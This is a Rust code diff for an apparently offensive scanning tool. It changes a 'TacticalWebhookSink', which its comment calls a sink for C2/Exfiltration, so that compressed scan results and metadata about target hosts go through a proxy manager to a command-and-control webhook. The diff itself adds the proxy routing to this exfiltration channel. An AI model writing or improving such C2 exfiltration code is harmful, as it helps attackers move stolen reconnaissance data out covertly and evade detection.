@@ -3,10 +3,11 @@ use anyhow::{Context, Result};
 use async_trait::async_trait;
 use tokio::io::AsyncWriteExt;
 use std::path::PathBuf;
-use sqlx::{SqlitePool, sqlite::SqliteConnectOptions, Row};
+use sqlx::{SqlitePool, sqlite::SqliteConnectOptions};
 use std::str::FromStr;
 use flate2::write::GzEncoder;
 use flate2::Compression;
+use std::sync::Arc;
 use std::io::Write;
 
 /// Trait for defining where scan results should be written.
@@ -64,7 +65,7 @@ impl DataSink for MultiSink {
 /// V10 HARDENING: Tactical Webhook Sink for C2/Exfiltration.
 /// Uses reqwest to send results to a remote endpoint in real-time.
 pub struct TacticalWebhookSink {
-    client: reqwest::Client,
+    proxy_manager: Arc<crate::utils::proxy::ProxyManager>,
     url: String,
     auth_token: String,
     buffer: Vec<TargetHost>,
@@ -72,10 +73,10 @@ pub struct TacticalWebhookSink {
 }
 
 impl TacticalWebhookSink {
-    pub fn new(url: String, auth_token: Option<String>) -> Result<Self> {
+    pub fn new(url: String, auth_token: Option<String>, pm: Arc<crate::utils::proxy::ProxyManager>) -> Result<Self> {
         let token = auth_token.context("Security Violation: C2 Webhook integration requires C2_TOKEN for authorization. Cannot send findings without authentication.")?;
         Ok(Self {
-            client: reqwest::Client::builder().danger_accept_invalid_certs(false).build()?,
+            proxy_manager: pm,
             url,
             auth_token: token,
             buffer: Vec::with_capacity(10),
@@ -96,7 +97,10 @@ impl TacticalWebhookSink {
         encoder.write_all(&json)?;
         let compressed_data = encoder.finish()?;
 
-        let mut request = self.client.post(&self.url)
+        let host = url::Url::parse(&self.url)?.host_str().unwrap_or("c2-server").to_string();
+        let (_, client) = self.proxy_manager.get_client_fail_closed(&host)?;
+
+        let mut request = client.post(&self.url)
             .header(reqwest::header::CONTENT_TYPE, "application/json")
             .header(reqwest::header::CONTENT_ENCODING, "gzip")
             .body(compressed_data);
@@ -121,7 +125,10 @@ impl DataSink for TacticalWebhookSink {
     }
 
     async fn write_metadata(&mut self, metadata: &ScanMetadata) -> Result<()> {
-        let mut request = self.client.post(&format!("{}/metadata", self.url))
+        let host = url::Url::parse(&self.url)?.host_str().unwrap_or("c2-server").to_string();
+        let (_, client) = self.proxy_manager.get_client_fail_closed(&host)?;
+
+        let mut request = client.post(&format!("{}/metadata", self.url))
             .json(metadata);
             
         request = request.header("Authorization", format!("Bearer {}", self.auth_token));
